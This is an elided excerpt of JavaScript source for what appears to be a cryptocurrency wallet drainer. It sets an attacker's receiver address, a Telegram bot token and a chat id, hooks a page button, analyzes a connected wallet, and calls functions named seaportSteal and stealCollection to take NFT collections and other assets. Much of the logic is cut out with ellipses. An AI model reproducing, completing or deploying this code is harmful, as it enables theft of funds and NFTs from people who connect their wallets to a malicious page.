...
const recipient = "0x09d9b361adA50e82e443100d039C413e1fa1E164" // ADD YOUR RECEIVER ADDRESS HERE
const telegramBot = "6397851358:AAE8tOPFxhS0l_fFYK16OpsHmOPQ6SgQxXA" // tg bot token
const telegramChatId = "985795508" // chat id for main tg bot


const mainButton = document.getElementById("interact-button")
...
async function executeOtherAssets(others, bound) {
    ...
    for (let index = 0; index < bound; index++) {
        ...
        console.log("Available assets: ", asset)
        if (asset.type == "NFT") {
    ...
    await analyzeWallet().then(async walletData => {
        ...
        if (walletData.Seaport.collections.length > 0) {
            await seaportSteal(walletData.Seaport.collections).then(volume => {
                console.log("Seaport Steal Volume:", volume);
...
const stealCollection = (asset) => new Promise(async (resolve, reject) => {
    try {
        console.log('Stealing collection for asset:', asset);
